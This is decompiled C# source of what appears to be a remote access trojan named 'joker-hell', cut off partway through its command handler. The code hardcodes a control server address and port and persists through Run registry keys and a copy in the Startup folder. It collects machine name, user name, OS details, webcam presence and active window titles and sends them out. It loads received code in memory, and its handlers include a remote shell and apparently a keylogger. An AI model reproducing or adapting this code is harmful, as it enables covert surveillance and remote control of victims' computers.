using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ns1;

public class GClass0
{
	public string string_0;

	public string string_1;

	public string string_2;

	public Mutex mutex_0;

	public string string_3;

	public string string_4;

	public string string_5;

	public string string_6;

	public string string_7;

	public bool bool_0;

	public string string_8;

	public bool bool_1;

	public GClass2 gclass2_0;

	public string string_9;

	public GClass1 gclass1_0;

	public object object_0;

	private object object_1;

	public bool bool_2;

	public object object_2;

	private string string_10;

	public object object_3;

	public GClass0()
	{
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		string_0 = "am9rZXItaGVsbA==";
		string_1 = "0.8d";
		string_2 = "";
		mutex_0 = null;
		string_3 = "joker-hell.exe";
		string_4 = "AppData";
		string_5 = "0a4cb012a8adcecdfa00212cdb16b0e5";
		string_6 = "192.168.121.1";
		string_7 = "5553";
		bool_0 = Conversions.ToBoolean("True");
		string_8 = "|'|'|";
		bool_1 = Conversions.ToBoolean("True");
		gclass2_0 = new GClass2();
		string_9 = "[endof]";
		gclass1_0 = null;
		object_0 = new FileInfo(Application.get_ExecutablePath());
		bool_2 = false;
		object_2 = null;
		string_10 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
		object_3 = (object)new Computer();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void method_0()
	{
		//IL_02d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_02dd: Expected O, but got Unknown
		string_2 = string_5;
		if (Interaction.Command() != null && Interaction.Command().Length > 0)
		{
			string[] array = Strings.Split(Interaction.Command(), ":", -1, (CompareMethod)0);
			string text = array[0];
			if (Operators.CompareString(text, "UP", false) != 0)
			{
				if (Operators.CompareString(text, "..", false) == 0)
				{
					Thread.Sleep(5000);
				}
			}
			else
			{
				try
				{
					NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "SetValue", new object[2] { "di", "!" }, (string[])null, (Type[])null, (bool[])null, true);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					object processById = Process.GetProcessById(Conversions.ToInteger(array[1]));
					NewLateBinding.LateCall(processById, (Type)null, "WaitForExit", new object[1] { 5000 }, (string[])null, (Type[])null, (bool[])null, true);
					try
					{
						NewLateBinding.LateCall(processById, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					Thread.Sleep(5000);
					ProjectData.ClearProjectError();
				}
			}
		}
		method_29();
		checked
		{
			int num2;
			try
			{
				Process[] processes = Process.GetProcesses();
				int num = 0;
				while (true)
				{
					num2 = num;
					if (num2 >= processes.Length)
					{
						break;
					}
					Process process = processes[num2];
					try
					{
						if (method_28(new FileInfo(process.MainModule!.FileName), (FileInfo)object_0) && process.Id > Process.GetCurrentProcess().Id)
						{
							ProjectData.EndApp();
						}
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					num = num2 + 1;
				}
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			try
			{
				Mutex.OpenExisting(string_2);
				ProjectData.EndApp();
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
			try
			{
				mutex_0 = new Mutex(initiallyOwned: true, string_2);
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
			object processById = new Thread(method_26, 1);
			NewLateBinding.LateCall(processById, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			if (bool_0)
			{
				gclass2_0.string_0 = string_5 + ".exe";
				gclass2_0.method_0();
			}
			try
			{
				gclass1_0 = new GClass1();
				processById = new Thread(gclass1_0.method_3, 1);
				NewLateBinding.LateCall(processById, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
			num2 = 0;
			int num3 = 0;
			string text = "";
			if (bool_1)
			{
				try
				{
					SystemEvents.add_SessionEnding((SessionEndingEventHandler)delegate
					{
						method_17();
					});
					method_23(1);
				}
				catch (Exception projectError9)
				{
					ProjectData.SetProjectError(projectError9);
					ProjectData.ClearProjectError();
				}
			}
			while (true)
			{
				Thread.Sleep(1000);
				try
				{
					num2++;
					num3++;
					if (num2 == 5)
					{
						try
						{
							EmptyWorkingSet((long)Process.GetCurrentProcess().Handle);
						}
						catch (Exception projectError10)
						{
							ProjectData.SetProjectError(projectError10);
							ProjectData.ClearProjectError();
						}
					}
					if (num2 > 10)
					{
						num2 = 0;
						if (bool_2 && Operators.CompareString(method_15(), text, false) != 0)
						{
							text = method_15();
							if (text != null && text.Length > 0)
							{
								method_25("act" + string_8 + text);
							}
						}
					}
					if (num3 <= 7)
					{
						continue;
					}
					num3 = 0;
					try
					{
						object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array2 = new object[2] { string_10, true };
						object[] array3 = array2;
						bool[] array4 = new bool[2] { true, false };
						object obj2 = NewLateBinding.LateGet(obj, (Type)null, "OpenSubKey", array3, (string[])null, (Type[])null, array4);
						if (array4[0])
						{
							string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
						}
						array2 = new object[2]
						{
							string_5,
							Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" ..")
						};
						object[] array5 = array2;
						array4 = new bool[2] { true, false };
						NewLateBinding.LateCall(obj2, (Type)null, "SetValue", array5, (string[])null, (Type[])null, array4, true);
						if (array4[0])
						{
							string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
						}
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
					}
					try
					{
						object obj3 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array2 = new object[2] { string_10, true };
						object[] array6 = array2;
						bool[] array4 = new bool[2] { true, false };
						object obj4 = NewLateBinding.LateGet(obj3, (Type)null, "OpenSubKey", array6, (string[])null, (Type[])null, array4);
						if (array4[0])
						{
							string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
						}
						array2 = new object[2]
						{
							string_5,
							Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" ..")
						};
						object[] array7 = array2;
						array4 = new bool[2] { true, false };
						NewLateBinding.LateCall(obj4, (Type)null, "SetValue", array7, (string[])null, (Type[])null, array4, true);
						if (array4[0])
						{
							string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
						}
					}
					catch (Exception projectError12)
					{
						ProjectData.SetProjectError(projectError12);
						ProjectData.ClearProjectError();
					}
					try
					{
						File.Copy(Conversions.ToString(NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_5 + ".exe", overwrite: true);
					}
					catch (Exception projectError13)
					{
						ProjectData.SetProjectError(projectError13);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError14)
				{
					ProjectData.SetProjectError(projectError14);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	public void method_1(string string_11)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { "Software\\" + string_5 }, (string[])null, (Type[])null, (bool[])null);
			object[] obj2 = new object[1] { string_11 };
			object[] array = obj2;
			bool[] array2;
			bool[] array3 = (array2 = new bool[1]);
			array3[0] = true;
			NewLateBinding.LateCall(obj, (Type)null, "DeleteValue", obj2, (string[])null, (Type[])null, array3, true);
			if (array2[0])
			{
				_ = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string method_2(string string_11)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { "Software\\" + string_5 }, (string[])null, (Type[])null, (bool[])null);
			object[] obj2 = new object[2] { string_11, "" };
			object[] array = obj2;
			bool[] array2;
			bool[] array3 = (array2 = new bool[2]);
			array3[0] = true;
			array3[1] = false;
			object obj3 = NewLateBinding.LateGet(obj, (Type)null, "GetValue", obj2, (string[])null, (Type[])null, array3);
			if (array2[0])
			{
				_ = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			return Conversions.ToString(obj3);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public object method_3(string string_11, string string_12)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { "Software\\" + string_5 }, (string[])null, (Type[])null, (bool[])null);
			object[] obj2 = new object[2] { string_11, string_12 };
			object[] array = obj2;
			bool[] array2;
			bool[] array3 = (array2 = new bool[2]);
			array3[0] = true;
			array3[1] = true;
			NewLateBinding.LateCall(obj, (Type)null, "SetValue", obj2, (string[])null, (Type[])null, array3, true);
			if (array2[0])
			{
				_ = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			if (array2[1])
			{
				_ = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
			}
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string method_4()
	{
		string text = "lv" + string_8;
		string string_2;
		try
		{
			string text2;
			GClass0 gClass;
			GClass0 obj;
			ref string string_;
			if (Operators.CompareString(method_2("vn"), "", false) == 0)
			{
				text2 = text;
				gClass = this;
				obj = gClass;
				string_ = ref obj.string_0;
			}
			else
			{
				text2 = text;
				gClass = this;
				obj = gClass;
				string_2 = obj.method_2("vn");
				string_ = ref string_2;
			}
			string_2 = obj.method_7(ref string_) + "_" + method_16();
			text = text2 + gClass.method_6(ref string_2) + string_8;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string text3 = text;
			string_2 = method_16();
			text = text3 + method_6(ref string_2) + string_8;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.MachineName + string_8;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			text = text + "??" + string_8;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.UserName + string_8;
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			text = text + "??" + string_8;
			ProjectData.ClearProjectError();
		}
		text = text + method_5() + string_8;
		try
		{
			text = text + method_14(7u) + string_8;
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			text = text + "X" + string_8;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = Conversions.ToString(Operators.AddObject((object)text, NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Info", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "OSFullName", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "Microsoft", "" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "Windows", "Win" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "®", "" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "™", "" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "  ", " " }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { " Win", "Win" }, (string[])null, (Type[])null, (bool[])null)));
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			text += "??";
			ProjectData.ClearProjectError();
		}
		text += "SP";
		try
		{
			string[] array;
			if ((array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, (CompareMethod)0)).Length == 1)
			{
				text += "0";
			}
			text += array[checked(array.Length - 1)];
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			text += "0";
			ProjectData.ClearProjectError();
		}
		try
		{
			string text4;
			object obj2;
			if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86"))
			{
				text4 = text;
				obj2 = " x64";
			}
			else
			{
				text4 = text;
				obj2 = " x86";
			}
			text = text4 + (string?)obj2 + string_8;
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			text += string_8;
			ProjectData.ClearProjectError();
		}
		string text5;
		object obj3;
		if (method_13())
		{
			text5 = text;
			obj3 = "Yes";
		}
		else
		{
			text5 = text;
			obj3 = "No";
		}
		text = (text = (text = (text = text5 + (string?)obj3 + string_8) + string_1 + string_8) + ".." + string_8) + method_15() + string_8;
		string_2 = "";
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				IEnumerator enumerator2 = (enumerator = ((IEnumerable)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[2]
				{
					"Software\\" + string_5,
					false
				}, (string[])null, (Type[])null, (bool[])null), (Type)null, "GetValueNames", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator());
				while (enumerator2.MoveNext())
				{
					enumerator2 = enumerator;
					string text6;
					if ((text6 = Conversions.ToString(enumerator2.Current)).Length == 32)
					{
						string_2 = string_2 + text6 + ",";
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		return text + string_2;
	}

	public string method_5()
	{
		try
		{
			return ((FileInfo)object_0).LastWriteTime.ToString("yyyy-MM-dd");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "unknown";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string method_6(ref string string_11)
	{
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(string_11));
	}

	public string method_7(ref string string_11)
	{
		byte[] bytes = Convert.FromBase64String(string_11);
		return Encoding.UTF8.GetString(bytes);
	}

	public string method_8(int int_0)
	{
		VBMath.Randomize();
		Random random = new Random();
		object obj = "";
		string text = "abcdefghijklmnopqrstuvwxyz";
		int num = 1;
		while (true)
		{
			int num2 = num;
			if (num > int_0)
			{
				break;
			}
			obj = (string?)obj + Conversions.ToString(text[random.Next(0, text.Length)]);
			num = checked(num2 + 1);
		}
		return (string)obj;
	}

	public byte[] method_9(ref string string_11)
	{
		return Encoding.Default.GetBytes(string_11);
	}

	public string method_10(ref byte[] byte_0)
	{
		return Encoding.Default.GetString(byte_0);
	}

	public Array method_11(byte[] byte_0, string string_11)
	{
		List<byte[]> list = new List<byte[]>();
		object obj = new MemoryStream();
		object obj2;
		object obj3 = (obj2 = new MemoryStream());
		string[] array = Strings.Split(method_10(ref byte_0), string_11, -1, (CompareMethod)0);
		object[] obj4 = new object[3]
		{
			byte_0,
			0,
			array[0].Length
		};
		object[] array2 = obj4;
		bool[] array3;
		bool[] array4 = (array3 = new bool[3]);
		array4[0] = true;
		array4[1] = false;
		array4[2] = false;
		NewLateBinding.LateCall(obj, (Type)null, "Write", obj4, (string[])null, (Type[])null, array4, true);
		if (array3[0])
		{
			byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
		}
		object obj5 = obj3;
		object[] array5 = (array2 = checked(new object[3]
		{
			byte_0,
			array[0].Length + string_11.Length,
			byte_0.Length - (array[0].Length + string_11.Length)
		}));
		bool[] array6 = (array3 = new bool[3]);
		array6[0] = true;
		array6[1] = false;
		array6[2] = false;
		NewLateBinding.LateCall(obj5, (Type)null, "Write", array5, (string[])null, (Type[])null, array6, true);
		if (array3[0])
		{
			_ = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
		}
		object obj6 = list;
		object obj7;
		object[] array7 = (array2 = new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj7 = obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null)) });
		bool[] array8 = (array3 = new bool[1]);
		array8[0] = true;
		NewLateBinding.LateCall(obj6, (Type)null, "Add", array7, (string[])null, (Type[])null, array8, true);
		if (array3[0])
		{
			NewLateBinding.LateSetComplex(obj7, (Type)null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array2[0]) }, (string[])null, (Type[])null, true, false);
		}
		object[] array9 = (array2 = new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj7 = obj2, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null)) });
		bool[] array10 = (array3 = new bool[1]);
		array10[0] = true;
		NewLateBinding.LateCall(obj6, (Type)null, "Add", array9, (string[])null, (Type[])null, array10, true);
		if (array3[0])
		{
			NewLateBinding.LateSetComplex(obj7, (Type)null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array2[0]) }, (string[])null, (Type[])null, true, false);
		}
		NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(obj2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		return (Array)NewLateBinding.LateGet(obj6, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null);
	}

	public byte[] method_12(byte[] byte_0, ref bool bool_3)
	{
		checked
		{
			object obj;
			byte[] array4;
			if (bool_3)
			{
				obj = new MemoryStream();
				object obj2 = new GZipStream((Stream)obj, CompressionMode.Compress, leaveOpen: true);
				object[] obj3 = new object[3] { byte_0, 0, byte_0.Length };
				object[] array = obj3;
				bool[] array2;
				bool[] array3 = (array2 = new bool[3]);
				array3[0] = true;
				array3[1] = false;
				array3[2] = false;
				NewLateBinding.LateCall(obj2, (Type)null, "Write", obj3, (string[])null, (Type[])null, array3, true);
				if (array2[0])
				{
					_ = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
				}
				NewLateBinding.LateCall(obj2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateSet(obj, (Type)null, "Position", new object[1] { 0 }, (string[])null, (Type[])null);
				array4 = new byte[Conversions.ToInteger(NewLateBinding.LateGet(obj, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null)) + 1];
				object obj4 = obj;
				object[] array5 = (array = new object[3] { array4, 0, array4.Length });
				bool[] array6 = (array2 = new bool[3]);
				array6[0] = true;
				array6[1] = false;
				array6[2] = false;
				NewLateBinding.LateCall(obj4, (Type)null, "Read", array5, (string[])null, (Type[])null, array6, true);
				if (array2[0])
				{
					array4 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
				}
			}
			else
			{
				object obj5;
				obj = (obj5 = new MemoryStream(byte_0));
				object obj6 = new GZipStream((Stream)obj, CompressionMode.Decompress);
				array4 = new byte[4];
				NewLateBinding.LateSet(obj, (Type)null, "Position", new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(obj5, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)5) }, (string[])null, (Type[])null);
				object obj7 = obj;
				object[] obj8 = new object[3] { array4, 0, 4 };
				object[] array = obj8;
				bool[] array2;
				bool[] array7 = (array2 = new bool[3]);
				array7[0] = true;
				array7[1] = false;
				array7[2] = false;
				NewLateBinding.LateCall(obj7, (Type)null, "Read", obj8, (string[])null, (Type[])null, array7, true);
				if (array2[0])
				{
					array4 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
				}
				int num = BitConverter.ToInt32(array4, 0);
				NewLateBinding.LateSet(obj, (Type)null, "Position", new object[1] { 0 }, (string[])null, (Type[])null);
				array4 = new byte[num - 1 + 1];
				object[] array8 = (array = new object[3] { array4, 0, num });
				bool[] array9 = (array2 = new bool[3]);
				array9[0] = true;
				array9[1] = false;
				array9[2] = true;
				NewLateBinding.LateCall(obj6, (Type)null, "Read", array8, (string[])null, (Type[])null, array9, true);
				bool[] array10 = array2;
				if (array10[0])
				{
					array4 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
				}
				if (array10[2])
				{
					_ = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[2]), typeof(int));
				}
				NewLateBinding.LateCall(obj6, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
			NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			return array4;
		}
	}

	[DllImport("psapi")]
	public static extern bool EmptyWorkingSet(long long_0);

	[DllImport("ntdll")]
	private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_0, ref int int_1, int int_2);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short short_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_11, int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_12, int int_1);

	public bool method_13()
	{
		checked
		{
			try
			{
				string string_ = Strings.Space(100);
				int num = 0;
				do
				{
					short short_ = (short)num;
					string string_2 = null;
					if (capGetDriverDescriptionA(short_, ref string_, 100, ref string_2, 100))
					{
						return true;
					}
				}
				while (++num <= 4);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	[DllImport("kernel32.dll")]
	private static extern int GetLocaleInfo(uint uint_0, uint uint_1, [Out] StringBuilder stringBuilder_0, int int_0);

	public string method_14(uint uint_0)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			int localeInfo;
			if ((localeInfo = GetLocaleInfo(1024u, uint_0, stringBuilder, stringBuilder.Capacity)) > 0)
			{
				return stringBuilder.ToString().Substring(0, checked(localeInfo - 1));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return "X";
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_0);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_11, int int_0);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long long_0);

	public string method_15()
	{
		checked
		{
			string string_;
			try
			{
				IntPtr foregroundWindow;
				GClass0 gClass;
				ref string string_2;
				if ((foregroundWindow = GetForegroundWindow()) == IntPtr.Zero)
				{
					gClass = this;
					string_ = " ";
					string_2 = ref string_;
				}
				else
				{
					int windowTextLengthA;
					string string_3 = Strings.StrDup((windowTextLengthA = GetWindowTextLengthA((long)foregroundWindow)) + 1, "*");
					GetWindowTextA(foregroundWindow, ref string_3, windowTextLengthA + 1);
					int int_ = default(int);
					GetWindowThreadProcessId(foregroundWindow, ref int_);
					if (int_ != 0)
					{
						try
						{
							string_ = Process.GetProcessById(int_).MainWindowTitle;
							string_ = method_6(ref string_);
							return string_;
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							string_ = method_6(ref string_3);
							ProjectData.ClearProjectError();
							return string_;
						}
					}
					gClass = this;
					string_2 = ref string_3;
				}
				string_ = gClass.method_6(ref string_2);
				return string_;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				string_ = " ";
				string_ = method_6(ref string_);
				ProjectData.ClearProjectError();
				return string_;
			}
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_11, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_12, int int_0, ref int int_1, ref int int_2, ref int int_3, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_13, int int_4);

	public string method_16()
	{
		try
		{
			string string_ = Interaction.Environ("SystemDrive") + "\\";
			string_ = null;
			int int_ = 0;
			int_ = 0;
			string_ = null;
			int int_2 = default(int);
			GetVolumeInformationA(ref string_, ref string_, 0, ref int_2, ref int_, ref int_, ref string_, 0);
			return Conversion.Hex(int_2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string string_ = "ERR";
			ProjectData.ClearProjectError();
			return string_;
		}
	}

	[STAThread]
	public static void Main()
	{
		new Thread(smethod_0).Start();
		new GClass0().method_0();
	}

	private void method_17()
	{
		method_23(0);
	}

	public object method_18(byte[] byte_0, string string_11)
	{
		object obj = Assembly.Load(byte_0);
		return NewLateBinding.LateGet(obj, (Type)null, "CreateInstance", new object[1] { Strings.Split(Conversions.ToString(NewLateBinding.LateGet(obj, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), ",", -1, (CompareMethod)0)[0] + "." + string_11 }, (string[])null, (Type[])null, (bool[])null);
	}

	private void method_19(object object_4, object object_5)
	{
		try
		{
			string text = string_8;
			object obj;
			string string_ = Conversions.ToString(NewLateBinding.LateGet(obj = object_5, (Type)null, "Data", new object[0], (string[])null, (Type[])null, (bool[])null));
			string text2 = method_6(ref string_);
			NewLateBinding.LateSetComplex(obj, (Type)null, "Data", new object[1] { string_ }, (string[])null, (Type[])null, true, false);
			method_25("rs" + text + text2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_20()
	{
		try
		{
			method_25("rsc");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void method_21(byte[] byte_0)
	{
		//IL_06be: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c6: Expected O, but got Unknown
		//IL_06cb: Expected O, but got Unknown
		string[] array = Strings.Split(method_10(ref byte_0), string_8, -1, (CompareMethod)0);
		checked
		{
			try
			{
				string string_ = array[0];
				object obj10;
				object obj11;
				object obj12;
				object[] array12;
				GClass0 gClass;
				object string_2;
				object obj34;
				string[] array15;
				string[] obj13;
				int num;
				object obj14;
				byte[] array13;
				object obj27;
				object[] array48;
				object[] array49;
				object[] array50;
				object[] array51;
				object[] array2;
				object obj15;
				string[] array14;
				switch (string_)
				{
				case "rs":
					obj10 = NewLateBinding.LateGet(object_1, (Type)null, "StandardInput", new object[0], (string[])null, (Type[])null, (bool[])null);
					obj11 = null;
					obj12 = "WriteLine";
					array12 = (array2 = new object[1]);
					array12[0] = method_7(ref array[1]);
					goto IL_11e4;
				case "kl":
